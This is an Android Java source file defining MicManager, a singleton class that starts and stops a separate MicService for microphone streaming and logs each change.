package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.service.MicService;

public class MicManager {
    private static final String TAG = Constants.TAG + ":MicMgr";
    private static MicManager instance;
    private final Context ctx;
    private boolean streaming = false;

    private MicManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized MicManager get(Context ctx) {
        if (instance == null) {
            instance = new MicManager(ctx);
        }
        return instance;
    }

    public void startStream() {
        if (streaming) return;
        Intent intent = new Intent(ctx, MicService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(intent);
        } else {
            ctx.startService(intent);
        }
        streaming = true;
        Log.i(TAG, "Mic stream started");
    }

    public void stopStream() {
        Intent intent = new Intent(ctx, MicService.class);
        ctx.stopService(intent);
        streaming = false;
        Log.i(TAG, "Mic stream stopped");
    }

    public boolean isStreaming() {
        return streaming;
    }
}
